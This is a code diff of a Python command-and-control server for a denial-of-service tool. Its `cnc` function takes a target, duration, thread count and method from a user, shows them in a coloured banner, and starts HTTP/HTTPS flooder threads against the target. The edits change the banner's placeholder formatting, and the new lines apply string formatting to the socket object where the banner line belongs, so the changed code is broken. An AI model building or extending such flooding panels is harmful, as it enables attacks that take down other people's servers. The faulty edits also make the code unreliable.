@@ -21,10 +21,10 @@ methods_icon = f"""         {color_char(196)}▄• ▄▌{color_char(197)}▄�
 {color_char(220)} ▪       {color_char(196)}  ▀▀▀{color_char(197)} .▀  ▀{color_char(198)} ▀  ▀{color_char(199)} ▀▀ █▪▀▀▀ {color_char(200)}▀▀▀ {color_char(201)}▀▀  █▪▀▀▀       {color_char(220)}▪
 {color_char(221)} ╚━━══════╦═ ════█═════════════════════█════ ═╦══════━━╝
 {color_char(222)}    ▀▀██══╩═══════════════════════════════════╩══██▀▀
-          {color_char(70)}TARGET  {color_char(255)}~ {color_char(196)}[{color_char(255)}z{color_char(196)}]
-          {color_char(71)}TIME    {color_char(255)}~ {color_char(197)}[{color_char(255)}x{color_char(7)}]
-          {color_char(72)}THREAD  {color_char(255)}~ {color_char(198)}[{color_char(255)}y{color_char(198)}]
-          {color_char(73)}METHODS {color_char(255)}~ {color_char(199)}[{color_char(255)}w{color_char(199)}]
+          {color_char(70)}TARGET  {color_char(255)}~ {color_char(196)}[{color_char(255)}%s{color_char(196)}]
+          {color_char(71)}TIME    {color_char(255)}~ {color_char(197)}[{color_char(255)}%s{color_char(7)}]
+          {color_char(72)}THREAD  {color_char(255)}~ {color_char(198)}[{color_char(255)}%s{color_char(198)}]
+          {color_char(73)}METHODS {color_char(255)}~ {color_char(199)}[{color_char(255)}%s{color_char(199)}]
 {color_char(223)}    ▄▄██══╦═══════════════════════════════════╦══██▄▄
 {color_char(224)} ╔━━══════╩═ ════█═════════════════════█════ ═╩══════━━╗
 {color_char(225)} ▪                                                     ▪
@@ -322,7 +322,7 @@ def cnc(client_socket,address,username):
     threader = commands[4]
     meth_http = commands[5]
     for a in methods_icon.split('\n'):
-     send_packet(client_socket,a.replace('z',f'{ip}:{port}').replace('x',str(times)).replace('y',threader).replace('w',COM),ex=True)
+     send_packet(client_socket%(f'{ip}:{port}',str(times),str(threader),COM),ex=True)
      time.sleep(0.1)
     threading.Thread(target=apis_flooder_http,args=(ip,port,times,threader,COM,meth_http)).start()
    else:
@@ -336,7 +336,7 @@ def cnc(client_socket,address,username):
      command = f'BADGES {username} 2'
     threader = commands[4]
     for a in methods_icon.split('\n'):
-     send_packet(client_socket,a.replace('z',f'{ip}:{port}').replace('x',str(times)).replace('y',threader).replace('w',COM),ex=True)
+     send_packet(client_socket%(f'{ip}:{port}',str(times),str(threader),COM),ex=True)
      time.sleep(0.1)
     threading.Thread(target=apis_flooder_http,args=(ip,port,times,threader,COM,'GET')).start()
    else:
@@ -353,7 +353,7 @@ def cnc(client_socket,address,username):
     threader = commands[4]
     meth_http = commands[5]
     for a in methods_icon.split('\n'):
-     send_packet(client_socket,a.replace('z',f'{protocol}://{domain}').replace('x',str(times)).replace('y',threader).replace('w',COM),ex=True)
+      send_packet(client_socket%(f'{protocol}://{domain}',str(times),str(threader),COM),ex=True)
      time.sleep(0.1)
     threading.Thread(target=apis_flooder_https,args=(protocol,domain,times,threader,COM,meth_http)).start()
    else:
@@ -408,7 +408,7 @@ def cnc(client_socket,address,username):
     time.sleep(0.1)
   elif COM == 'SUDPANG!' or COM == 'BHBNEDBT6G4' or COM == '/WATCH?v=BHBNEDBT6G4':
    command = f'BADGES {username} 5'
-  else:send_packet(client_socket,f'{color_char(196)}Not {color_char(197)}Found {color_char(198)}Command')
+  else:send_packet(client_socket,f'{color_char(196)}Not {color_char(197)}Found {color_char(198)}Command',ex=True)
    
   send_packet(client_socket,prompt)
 threading.Thread(target=server_builder).start()
